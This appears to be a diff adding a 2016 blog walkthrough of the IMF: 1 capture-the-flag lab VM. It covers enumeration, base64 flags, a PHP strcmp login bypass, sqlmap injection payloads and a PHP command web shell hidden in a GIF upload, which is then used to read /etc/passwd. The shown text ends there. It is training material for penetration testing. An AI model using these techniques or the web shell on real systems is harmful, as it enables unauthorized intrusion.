@@ -1,0 +1,954 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>
+    
+      IMF: 1 &middot; T0w3ntum
+    
+  </title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png">
+</head>
+
+
+  <body>
+    <nav class="nav">
+      <div class="nav-container">
+        <a href="/">
+          <h2 class="nav-title">T0w3ntum</h2>
+        </a>
+        <ul>
+          <li><a href="/about">About</a></li>
+          <li><a href="/">Posts</a></li>
+        </ul>
+    </div>
+  </nav>
+
+    <main>
+      <div class="post">
+  <div class="post-info">
+    <span>Written by</span>
+    
+        T0w3ntum
+    
+
+    
+      <br>
+      <span>on&nbsp;</span><time datetime="2016-11-06 00:00:00 -0500">November 06, 2016</time>
+    
+  </div>
+
+  <h1 class="post-title">IMF: 1</h1>
+  <div class="post-line"></div>
+
+  <h2 id="imf-1-walkthrough">IMF: 1 Walkthrough</h2>
+
+<p>As always, let’s start off with some enumeration to see what we are dealing with here.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nmap --min-rate=400 -T4 -p- 192.168.1.62
+
+Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-11-04 18:51 EDT
+Nmap scan report for imf (192.168.1.62)
+Host is up (0.00068s latency).
+Not shown: 65534 filtered ports
+PORT   STATE SERVICE
+80/tcp open  http
+MAC Address: 00:0C:29:5F:9F:7C (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 86.89 seconds
+</code></pre></div></div>
+
+<p>Not much, port 8o only. Let’s see what’s going on with it.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# curl -s http://192.168.1.62 | html2text
+
+ Toggle navigation
+    * Home
+    * Projects
+    * Contact_Us
+
+****** Impossible Mission Force ******
+An independent intelligence agency for the United States government
+specialising in espionage.
+
+Copyright Â© 2016 Impossible Mission Force. All rights reserved.
+</code></pre></div></div>
+
+<p>I checked all the other pages, looks like we have our first flag on contact.php</p>
+
+<blockquote>
+  <p>flag1{YWxsdGhlZmlsZXM=}</p>
+</blockquote>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# curl -s http://192.168.1.62/contact.php
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html</span> <span class="na">class=</span><span class="s">"no-js"</span><span class="nt">&gt;</span>
+...SNIP...
+    <span class="nt">&lt;section</span> <span class="na">id=</span><span class="s">"service"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
+            <span class="c">&lt;!-- flag1{YWxsdGhlZmlsZXM=} --&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"service-wrapper"</span><span class="nt">&gt;</span>
+...SNIP...
+<span class="nt">&lt;/html&gt;</span>
+
+
+root@kali:~# echo YWxsdGhlZmlsZXM= | base64 -d
+allthefiles
+</code></pre></div></div>
+
+<p>Also interesting was the name of the JavaScript files. Appeared to be base64. Judging by the hint from Flag1, I combined them into one string and decoded it.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!-- Js --&gt;
+        &lt;script src="js/vendor/modernizr-2.6.2.min.js"&gt;&lt;/script&gt;
+        &lt;script src="js/vendor/jquery-1.10.2.min.js"&gt;&lt;/script&gt;
+        &lt;script src="js/bootstrap.min.js"&gt;&lt;/script&gt;
+        &lt;script src="js/ZmxhZzJ7YVcxbVl.js"&gt;&lt;/script&gt;
+        &lt;script src="js/XUnRhVzVwYzNS.js"&gt;&lt;/script&gt;
+        &lt;script src="js/eVlYUnZjZz09fQ==.min.js"&gt;&lt;/script&gt;
+        &lt;script&gt;
+
+root@kali:~# echo ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ== | base64 -d
+flag2{aW1mYWRtaW5pc3RyYXRvcg==}
+
+root@kali:~# echo aW1mYWRtaW5pc3RyYXRvcg== | base64 -d
+imfadministratorr
+</code></pre></div></div>
+
+<blockquote>
+  <p>flag2{aW1mYWRtaW5pc3RyYXRvcg==}</p>
+</blockquote>
+
+<p>Decoding flag2, we get imfadministrator. As I wasn’t seeing much else, I figured it might be a directory. I was right.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# curl -s http://192.168.1.62/imfadministrator/ | html2text
+Username:[user                ]
+Password:[********************]
+[Login]
+root@kali:~#
+root@kali:~# curl -s http://192.168.1.62/imfadministrator/
+&lt;form method="POST" action=""&gt;
+&lt;label&gt;Username:&lt;/label&gt;&lt;input type="text" name="user" value=""&gt;&lt;br /&gt;
+&lt;label&gt;Password:&lt;/label&gt;&lt;input type="password" name="pass" value=""&gt;&lt;br /&gt;
+&lt;input type="submit" value="Login"&gt;
+&lt;!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger --&gt;
+&lt;/form&gt;
+
+</code></pre></div></div>
+<p>I was presented with a login form, judging by the HTML comment, looks like SQL isn’t working…</p>
+
+<p>I enumerated the usernames a bit and found that the only active user was <strong>rmichaels</strong>. I gathered the usernames from the contact page.</p>
+
+<p>I spent a good amount of time on this, including SQL authentication bypass just in case. Waldo over at IRC gave me his idea and a <a href="http://danuxx.blogspot.ca/2013/03/unauthorized-access-bypassing-php-strcmp.html">link</a> he was looking at. Turns out it contained the answer.</p>
+
+<blockquote>
+  <p>flag3{Y29udGludWVUT2Ntcw==}</p>
+</blockquote>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# curl -X POST -F "pass=password" -F "user=rmichaels" http://192.168.1.62/imfadministrator/
+Invalid password&lt;form method="POST" action=""&gt;
+&lt;label&gt;Username:&lt;/label&gt;&lt;input type="text" name="user" value=""&gt;&lt;br /&gt;
+&lt;label&gt;Password:&lt;/label&gt;&lt;input type="password" name="pass" value=""&gt;&lt;br /&gt;
+&lt;input type="submit" value="Login"&gt;
+&lt;!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger --&gt;
+&lt;/form&gt;
+root@kali:~#
+root@kali:~# curl -c /tmp/imf.cookie -X POST -F "pass[]=password" -F "user=rmichaels" http://192.168.1.62/imfadministrator/
+flag3{Y29udGludWVUT2Ntcw==}&lt;br /&gt;Welcome, rmichaels&lt;br /&gt;&lt;a href='cms.php?pagename=home'&gt;IMF CMS&lt;/a&gt;r
+
+
+root@kali:~# echo Y29udGludWVUT2Ntcw== | base64 -d
+continueTOcms
+</code></pre></div></div>
+
+<p>Following the clues, I continued to the CMS and enumerated the pages a bit.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# curl -b /tmp/imf.cookie http://192.168.1.62/imfadministrator/cms.php --data "pagename=home"
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span>IMF CMS<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;h1&gt;</span>IMF CMS<span class="nt">&lt;/h1&gt;</span>
+Menu:
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'cms.php?pagename=home'</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;</span> |
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'cms.php?pagename=upload'</span><span class="nt">&gt;</span>Upload Report<span class="nt">&lt;/a&gt;</span> |
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'cms.php?pagename=disavowlist'</span><span class="nt">&gt;</span>Disavowed list<span class="nt">&lt;/a&gt;</span> |
+Logout
+<span class="nt">&lt;br</span> <span class="nt">/&gt;&lt;br/&gt;</span>
+Welcome to the IMF Administration.<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+
+root@kali:~# curl -b /tmp/imf.cookie http://192.168.1.62/imfadministrator/cms.php?pagename=upload
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span>IMF CMS<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;h1&gt;</span>IMF CMS<span class="nt">&lt;/h1&gt;</span>
+Menu:
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'cms.php?pagename=home'</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;</span> |
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'cms.php?pagename=upload'</span><span class="nt">&gt;</span>Upload Report<span class="nt">&lt;/a&gt;</span> |
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'cms.php?pagename=disavowlist'</span><span class="nt">&gt;</span>Disavowed list<span class="nt">&lt;/a&gt;</span> |
+Logout
+<span class="nt">&lt;br</span> <span class="nt">/&gt;&lt;br/&gt;</span>
+Under Construction.<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+
+root@kali:~# curl -b /tmp/imf.cookie http://192.168.1.62/imfadministrator/cms.php?pagename=disavowlist
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span>IMF CMS<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;h1&gt;</span>IMF CMS<span class="nt">&lt;/h1&gt;</span>
+Menu:
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'cms.php?pagename=home'</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;</span> |
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'cms.php?pagename=upload'</span><span class="nt">&gt;</span>Upload Report<span class="nt">&lt;/a&gt;</span> |
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'cms.php?pagename=disavowlist'</span><span class="nt">&gt;</span>Disavowed list<span class="nt">&lt;/a&gt;</span> |
+Logout
+<span class="nt">&lt;br</span> <span class="nt">/&gt;&lt;br/&gt;</span>
+<span class="nt">&lt;h1&gt;</span>Disavowed List<span class="nt">&lt;/h1&gt;&lt;img</span> <span class="na">src=</span><span class="s">"./images/redacted.jpg"</span><span class="nt">&gt;&lt;br</span> <span class="nt">/&gt;&lt;ul&gt;&lt;li&gt;</span>*********<span class="nt">&lt;/li&gt;&lt;li&gt;</span>****** ******<span class="nt">&lt;/li&gt;&lt;li&gt;</span>*******<span class="nt">&lt;/li&gt;&lt;li&gt;</span>**** ********<span class="nt">&lt;/li&gt;&lt;/ul&gt;&lt;br</span> <span class="nt">/&gt;</span>-Secretary<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+
+</code></pre></div></div>
+<p>I tried LFI/RFI on the pagename= parameter with no success. Thinking it might be SQL injection, I tried ‘1’ OR ‘1 and got an error message.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# curl -b /tmp/imf.cookie 'http://192.168.1.62/imfadministrator/cms.php?pagename=%271%27%20OR%20%271'
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span>IMF CMS<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;h1&gt;</span>IMF CMS<span class="nt">&lt;/h1&gt;</span>
+Menu:
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'cms.php?pagename=home'</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;</span> |
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'cms.php?pagename=upload'</span><span class="nt">&gt;</span>Upload Report<span class="nt">&lt;/a&gt;</span> |
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'cms.php?pagename=disavowlist'</span><span class="nt">&gt;</span>Disavowed list<span class="nt">&lt;/a&gt;</span> |
+Logout
+<span class="nt">&lt;br</span> <span class="nt">/&gt;&lt;br/&gt;</span>
+<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;b&gt;</span>Warning<span class="nt">&lt;/b&gt;</span>:  mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in <span class="nt">&lt;b&gt;</span>/var/www/html/imfadministrator/cms.php<span class="nt">&lt;/b&gt;</span> on line <span class="nt">&lt;b&gt;</span>29<span class="nt">&lt;/b&gt;&lt;br</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>Time to fire up SQLMap.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# sqlmap --cookie="PHPSESSID=b1qs1kve0kevsanmk870586g31" --url "http://192.168.1.62/imfadministrator/cms.php?pagename=home" --dump --dbms=MySQL --threads 5
+         _
+ ___ ___| |_____ ___ ___  {1.0.9.1#dev}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 19:58:06
+
+[19:58:06] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pagename (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pagename=home' AND 5180=5180 AND 'qpzo'='qpzo
+
+    Type: error-based
+    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pagename=home' AND (SELECT 8478 FROM(SELECT COUNT(*),CONCAT(0x7178627871,(SELECT (ELT(8478=8478,1))),0x71787a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'KnKx'='KnKx
+
+    Type: AND/OR time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind
+    Payload: pagename=home' AND SLEEP(5) AND 'CkoX'='CkoX
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 1 column
+    Payload: pagename=-7536' UNION ALL SELECT CONCAT(0x7178627871,0x43424d43504d6a4d6b466e525a71467443576a6149516a45434d624d68484e56655647446d766b64,0x71787a6271)#
+---
+...SNIP...
+Database: admin
+Table: pages
+[4 entries]
++----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| id | pagename             | pagedata                                                                                                                                                              |
++----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 1  | upload               | Under Construction.                                                                                                                                                   |
+| 2  | home                 | Welcome to the IMF Administration.                                                                                                                                    |
+| 3  | tutorials-incomplete | Training classrooms available. &lt;br /&gt;&lt;img src="./images/whiteboard.jpg"&gt;&lt;br /&gt; Contact us for training.                                                               |
+| 4  | disavowlist          | &lt;h1&gt;Disavowed List&lt;/h1&gt;&lt;img src="./images/redacted.jpg"&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;*********&lt;/li&gt;&lt;li&gt;****** ******&lt;/li&gt;&lt;li&gt;*******&lt;/li&gt;&lt;li&gt;**** ********&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;-Secretary |
++----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+[19:58:08] [INFO] table 'admin.pages' dumped to CSV file '/root/.sqlmap/output/192.168.1.62/dump/admin/pages.csv'
+[19:58:08] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.1.62'
+
+[*] shutting down at 19:58:08
+</code></pre></div></div>
+
+<p>Looks like we have another page, tutorials-incomplete.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# curl -s -b /tmp/imf.cookie 'http://192.168.1.62/imfadministrator/cms.php?pagename=tutorials-incomplete'
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span>IMF CMS<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;h1&gt;</span>IMF CMS<span class="nt">&lt;/h1&gt;</span>
+Menu:
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'cms.php?pagename=home'</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;</span> |
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'cms.php?pagename=upload'</span><span class="nt">&gt;</span>Upload Report<span class="nt">&lt;/a&gt;</span> |
+<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'cms.php?pagename=disavowlist'</span><span class="nt">&gt;</span>Disavowed list<span class="nt">&lt;/a&gt;</span> |
+Logout
+<span class="nt">&lt;br</span> <span class="nt">/&gt;&lt;br/&gt;</span>
+Training classrooms available. <span class="nt">&lt;br</span> <span class="nt">/&gt;&lt;img</span> <span class="na">src=</span><span class="s">"./images/whiteboard.jpg"</span><span class="nt">&gt;&lt;br</span> <span class="nt">/&gt;</span> Contact us for training.<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>the whiteboard.jgp image contained a QR code, scanning it with my phone produced flag 4.</p>
+
+<blockquote>
+  <p>flag4{dXBsb2Fkcjk0Mi5waHA=}</p>
+</blockquote>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# echo dXBsb2Fkcjk0Mi5waHA= | base64 -d
+uploadr942.php
+</code></pre></div></div>
+
+<p>Another page to visit.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# curl -b /tmp/imf.cookie 'http://192.168.1.62/imfadministrator/uploadr942.php'
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span>File Uploader<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;h1&gt;</span>Intelligence Upload Form<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"Upload"</span> <span class="na">action=</span><span class="s">""</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;p&gt;</span>
+		<span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"file"</span><span class="nt">&gt;</span>File to upload:<span class="nt">&lt;/label&gt;</span>
+		<span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">"file"</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">name=</span><span class="s">"file"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;/p&gt;</span>
+
+    <span class="nt">&lt;p&gt;</span>
+    	<span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">"submit"</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">name=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Upload"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>Looks like we can upload stuff, but there are restrictions.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# curl -b /tmp/imf.cookie -F "file=@/tmp/imf.php" 'http://192.168.1.62/imfadministrator/uploadr942.php'
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span>File Uploader<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;h1&gt;</span>Intelligence Upload Form<span class="nt">&lt;/h1&gt;</span>
+Error: Invalid file type.<span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"Upload"</span> <span class="na">action=</span><span class="s">""</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;p&gt;</span>
+		<span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"file"</span><span class="nt">&gt;</span>File to upload:<span class="nt">&lt;/label&gt;</span>
+		<span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">"file"</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">name=</span><span class="s">"file"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;/p&gt;</span>
+
+    <span class="nt">&lt;p&gt;</span>
+    	<span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">"submit"</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">name=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Upload"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+root@kali:~#
+root@kali:~# curl -b /tmp/imf.cookie -F "file=@/tmp/redacted-thumb.jpg" 'http://192.168.1.62/imfadministrator/uploadr942.php'
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span>File Uploader<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;h1&gt;</span>Intelligence Upload Form<span class="nt">&lt;/h1&gt;</span>
+File successfully uploaded.
+<span class="c">&lt;!-- 2b705aada13b --&gt;</span><span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"Upload"</span> <span class="na">action=</span><span class="s">""</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;p&gt;</span>
+		<span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"file"</span><span class="nt">&gt;</span>File to upload:<span class="nt">&lt;/label&gt;</span>
+		<span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">"file"</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">name=</span><span class="s">"file"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;/p&gt;</span>
+
+    <span class="nt">&lt;p&gt;</span>
+    	<span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">"submit"</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">name=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Upload"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>was giving me a file identifier, but I couldn’t find where they were uploaded. Dirbed the imfadministrator page.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# dirb http://192.168.1.62/imfadministrator/ -c "PHPSESSID=b1qs1kve0kevsanmk870586g31"
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Nov  4 20:19:45 2016
+URL_BASE: http://192.168.1.62/imfadministrator/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+COOKIE: PHPSESSID=b1qs1kve0kevsanmk870586g31
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.1.62/imfadministrator/ ----
+==&gt; DIRECTORY: http://192.168.1.62/imfadministrator/images/                                                                                                    
++ http://192.168.1.62/imfadministrator/index.php (CODE:200|SIZE:91)                                                                                            
+==&gt; DIRECTORY: http://192.168.1.62/imfadministrator/uploads/                                                                                                   
+
+---- Entering directory: http://192.168.1.62/imfadministrator/images/ ----
++ http://192.168.1.62/imfadministrator/images/index.php (CODE:200|SIZE:0)                                                                                      
+
+---- Entering directory: http://192.168.1.62/imfadministrator/uploads/ ----
+
+-----------------
+END_TIME: Fri Nov  4 20:20:09 2016
+DOWNLOADED: 13836 - FOUND: 2
+</code></pre></div></div>
+
+<p>Found it in /uploads/
+Now I just need to get some command execution. Luckily we can inject PHP into a .gif file.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# echo "FFD8FFE0" | xxd -r -p &gt; /tmp/shell.gif
+root@kali:~#
+root@kali:~# echo '<span class="cp">&lt;?php $cmd=$_GET["cmd"]; echo `$cmd`; ?&gt;</span>' &gt;&gt; /tmp/shell.gif
+root@kali:~#
+root@kali:~# curl -b /tmp/imf.cookie -F 'file=@/tmp/shell.gif' 'http://192.168.1.62/imfadministrator/uploadr942.php'
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span>File Uploader<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;h1&gt;</span>Intelligence Upload Form<span class="nt">&lt;/h1&gt;</span>
+File successfully uploaded.
+<span class="c">&lt;!-- e62bbedc5a5a --&gt;</span><span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"Upload"</span> <span class="na">action=</span><span class="s">""</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;p&gt;</span>
+		<span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"file"</span><span class="nt">&gt;</span>File to upload:<span class="nt">&lt;/label&gt;</span>
+		<span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">"file"</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">name=</span><span class="s">"file"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;/p&gt;</span>
+
+    <span class="nt">&lt;p&gt;</span>
+    	<span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">"submit"</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">name=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Upload"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+root@kali:~#
+root@kali:~# curl -b /tmp/imf.cookie http://192.168.1.62/imfadministrator/uploads/e62bbedc5a5a.gif?cmd=id
+����uid=33(www-data) gid=33(www-data) groups=33(www-data)
+root@kali:~#
+root@kali:~# curl -c /tmp/imf.cookie 'http://192.168.1.62/imfadministrator/uploads/16344eb0919a.gif?cmd=cat%20%2Fetc%2Fpasswd'
+����root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
+messagebus:x:108:112::/var/run/dbus:/bin/false
+uuidd:x:109:113::/run/uuidd:/bin/false
+dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
+setup:x:1000:1000:setup,,,:/home/setup:/bin/bash
+root@kali:~#
